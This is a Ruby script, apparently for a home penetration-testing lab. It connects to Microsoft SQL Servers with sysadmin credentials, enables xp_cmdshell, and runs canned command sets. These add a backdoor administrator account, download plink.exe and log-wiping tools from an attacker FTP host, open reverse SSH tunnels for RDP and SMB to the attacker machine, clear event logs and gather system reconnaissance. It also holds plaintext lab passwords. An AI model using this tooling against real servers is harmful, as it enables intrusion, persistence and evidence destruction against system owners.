require 'tiny_tds'

class XpCmdShell

  def initialize h


# lab
    @lab = {
           :lab1 => {
               :os => 'WINXP',
               :user => 'Administrator',
               :pass => '!dowN09',
               :location => 'Retina',
               :role => 'hx0r',
               :ip => '192.168.1.111',
               :ssh => {:user => 'ssh_account',
                        :pass => 'ssh_pass',
                        :port => '22',
               },
               :ftp => {:user => 'ftp_user',
                        :pass => 'ftp_pass',
                        :port => '21',
               },
           },
           :lab2 => {
               :os => 'WINXP',
               :user => 'user', #Administrator
               :pass => 'user_pass', #lunch701
               :location => 'Retina',
               :role => 'TARGET',
               :ip => '192.168.1.30',
               :mssql => {:version => '2005',
                          :user => 'sa',
                          :pass => 'SYSADM',
                          :port => '1035',
                        },
            },
           :lab3 => {
               :os => 'WIN 7',
               :user => 'Administrator',
               :pass => 'WINPRO701',
               :location => 'macmini',
               :role => 'TARGET',
               :ip => '192.168.1.',

           },
           :lab4 => {
               :os => 'WINXP',
               :user => 'Administrator',
               :pass => 'WINXP_PRO701',
               :location => 'macmini',
               :role => 'TARGET',
               :ip => '192.168.1.214',
               :mssql => {:version => '2005',
                          :user => 'sa',
                          :pass => 'LUNCH701',
                          :port => '1214'
               },
           },
           :lab5 => {
               :os => 'Debian - linux',
               :user => 'debian',
               :pass => 'lunch701',
               :location => 'notebook',
               :role => 'hx0r',
               :ip => '192.168.1.214',
               :ssh => {:user => 'user',
                        :pass => 'user_pass',
                        :port => '22',
               }

           },
    }



    case h[:ssh]

      when  'lab1' then
        @strSSH_IP = @lab[:lab1][:ip]
        @strSSH_PORT = @lab[:lab1][:ssh][:port]
        @strSSH_USER = @lab[:lab1][:ssh][:user]
        @strSSH_PASS = @lab[:lab1][:ssh][:pass]


      when 'lab5' then

        @strSSH_IP = @lab[:lab5][:ip]
        @strSSH_PORT = @lab[:lab5][:ssh][:port]
        @strSSH_USER = @lab[:lab5][:ssh][:user]
        @strSSH_PASS = @lab[:lab5][:ssh][:pass]
      end




    case h[:ftp]

      when 'lab1' then
        @strFTP_IP = @lab[:lab1][:ip]
        @strFTP_PASS = @lab[:lab1][:ftp][:pass]
        @strFTP_USER = @lab[:lab1][:ftp][:user]
        @strFTP_PORT = @lab[:lab1][:ftp][:port]

      when 'lab5' then
        @strFTP_IP = @lab[:lab5][:ip]
        @strFTP_PASS = @lab[:lab5][:ftp][:pass]
        @strFTP_USER = @lab[:lab5][:ftp][:user]
        @strFTP_PORT = @lab[:lab5][:ftp][:port]

    end



    case h[:mssql]

      when 'lab2'

        @strSQL_USER = @lab[:lab2][:mssql][:user]
        @strSQL_PASS = @lab[:lab2][:mssql][:pass]
        @strSQL_IP   = @lab[:lab2][:ip]
        @strSQL_PORT = @lab[:lab2][:mssql][:port]

      when 'lab4'
        @strSQL_USER = @lab[:lab4][:mssql][:user]
        @strSQL_PASS = @lab[:lab4][:mssql][:pass]
        @strSQL_IP   = @lab[:lab4][:ip]
        @strSQL_PORT = @lab[:lab4][:mssql][:port]


    end


    case h[:plink]

      when 'lab2'
        @strTARGET_IP_3389 = @lab[:lab2][:ip]
        @strTARGET_IP_445 = @lab[:lab2][:ip]
      when 'lab4'
        @strTARGET_IP_3389 = @lab[:lab4][:ip]
        @strTARGET_IP_445 = @lab[:lab4][:ip]
    end


#Fake user forget Win box
    @strWIN_USER = 'hx0r'
    @strWIN_PASSW = 'pass'


#SQL hash

    @strSQLHASH = {
        :makeCmdShellActive => [
            "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
        ],
        :makeCmdShellInactive => [
            "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;"
        ],
        :createWin => [
            "EXEC xp_cmdshell 'net user /add #{@strWIN_USER} #{@strWIN_PASSW}'", # login: user  password: pass
            "EXEC xp_cmdshell 'net localgroup administrators #{@strWIN_USER} /add'"
        ],
        :makeUserActive =>[
            "EXEC xp_cmdshell 'NET USER #{@strWIN_USER} /DOMAIN /ACTIVE:YES'"],
        :makeUserInActive =>[
            "EXEC xp_cmdshell 'NET USER #{@strWIN_USER} /DOMAIN /ACTIVE:NO'"],
        :delWinUser => [
            "EXEC xp_cmdshell 'net user #{@strWIN_USER} /del'"],
       :tree => [
            "EXEC xp_cmdshell 'tree c:\\'"],
        :ftpGetPlink => [
            "EXEC xp_cmdshell 'echo open #{@strFTP_IP} > get.txt'",
            "EXEC xp_cmdshell 'echo #{@strFTP_USER} >> get.txt'",
            "EXEC xp_cmdshell 'echo #{@strFTP_PASS} >> get.txt'",
            "EXEC xp_cmdshell 'echo get plink.exe plink.exe.txt >> get.txt'",
            "EXEC xp_cmdshell 'echo bye >> get.txt'",
            "EXEC xp_cmdshell 'ftp -s:get.txt'",
            "EXEC xp_cmdshell 'ren plink.exe.txt plink.exe'",
            "EXEC xp_cmdshell 'del get.txt'"
        ],
        :ftpGetClearEv=> [
            "EXEC xp_cmdshell 'echo open #{@strFTP_IP} > get.txt'",
            "EXEC xp_cmdshell 'echo #{@strFTP_USER} >> get.txt'",
            "EXEC xp_cmdshell 'echo #{@strFTP_PASS} >> get.txt'",
            "EXEC xp_cmdshell 'echo get clearev.vbs clearev.txt >> get.txt'",
            "EXEC xp_cmdshell 'echo get cleanafterme.exe cleanafterme.txt >> get.txt'",
            "EXEC xp_cmdshell 'echo bye >> get.txt'",
            "EXEC xp_cmdshell 'ftp -s:get.txt'",
            "EXEC xp_cmdshell 'ren clearev.txt clearev.vbs'",
            "EXEC xp_cmdshell 'ren cleanafterme.txt cleanafterme.exe'",
            "EXEC xp_cmdshell 'del get.txt'"
        ],
        :ftpGetClearSSH => [
            "EXEC xp_cmdshell 'echo open #{@strFTP_IP} > get.txt'",
            "EXEC xp_cmdshell 'echo #{@strFTP_USER} >> get.txt'",
            "EXEC xp_cmdshell 'echo #{@strFTP_PASS} >> get.txt'",
            "EXEC xp_cmdshell 'echo get clearSSH.vbs clearSSH.txt >> get.txt'",
            "EXEC xp_cmdshell 'echo bye >> get.txt'",
            "EXEC xp_cmdshell 'ftp -s:get.txt'",
            "EXEC xp_cmdshell 'ren clearSSH.txt clearSSH.vbs'",
            "EXEC xp_cmdshell 'del get.txt'"
        ],
        :forward_3389_to_3388 =>[
            "EXEC xp_cmdshell'Echo N > ssh.txt'",
            "EXEC xp_cmdshell 'plink.exe  -N -l #{@strSSH_USER} -pw #{@strSSH_PASS} -P #{@strSSH_PORT} -R 3388:#{@strTARGET_IP_3389}:3389 #{@strSSH_IP}< ssh.txt'",
            "EXEC xp_cmdshell 'del ssh.txt'",
            ],

        :forward_445_From_445 =>[
            "EXEC xp_cmdshell'Echo N > ssh.txt'",
            "EXEC xp_cmdshell 'plink.exe  -N -l #{@strSSH_USER} -pw #{@strSSH_PASS} -P #{@strSSH_PORT} -R 445:#{@strTARGET_IP_3389}:445 #{@strSSH_IP}< ssh.txt'",
            "EXEC xp_cmdshell 'del ssh.txt'"
        ],
        :doClearEv => [
            "EXEC xp_cmdshell 'cscript clearev.vbs'",
        ],
        :doWinRestart => [
            "EXEC xp_cmdshell 'shutdown -r -f -t 2'", # force restart in 2 seconds
            "EXEC xp_cmdshell 'cscript clearev.vbs'"
        ],
        :tasklist => [ #show all running processes
            "EXEC xp_cmdshell 'tasklist'"
        ],
        :taskkill => [
            "EXEC xp_cmdshell 'taskkill /pid 576 /f'" #change the pid when you have run tasklist
        ],
        :ipconfig => [
            "EXEC xp_cmdshell 'ipconfig'"
        ],
        :scrape => [
            "EXEC xp_cmdshell 'net users'",
            "EXEC xp_cmdshell 'net start'",
            "EXEC xp_cmdshell 'net use'",
            "EXEC xp_cmdshell 'netstat -ano '",
            "EXEC xp_cmdshell 'tasklist'",
            "EXEC xp_cmdshell 'arp -a'",
            "EXEC xp_cmdshell 'ipconfig /all'",
            "EXEC xp_cmdshell 'set'",
            "EXEC xp_cmdshell 'systeminfo'",
       ],
    }
  end



  def doCmd(cmdArr)

    begin

      client = TinyTds::Client.new(:username => @strSQL_USER, :password => @strSQL_PASS, :host => @strSQL_IP, :port => @strSQL_PORT)
       cmdArr.each do |key|
         puts "[+] plink.exe  -N -l #{@strSSH_USER} -pw #{@strSSH_PASS} -P #{@strSSH_PORT} -R 3388:#{@strTARGET_IP_3389}:3389 #{@strSSH_IP}'"
         puts "[+] " + key.to_s
         lineArr = @strSQLHASH[key]
         lineArr.each do |line|
            result = client.execute(line)
            result.each do |row|
             puts row.to_s[12..-3]
             #puts row.to_s
            end
         end
        puts ""
       end
    rescue Exception => e
      puts e.message
      exit
     # puts e.backtrace.inspect
    end
  client.close
  end

end

xp = XpCmdShell.new  ({:ssh => 'lab1', :ftp=> 'lab1',:mssql=> 'lab2',:plink=> 'lab2'})
#xp.doCmd([:forward_3389_to_3388])
#xp.doCmd([:ipconfig])



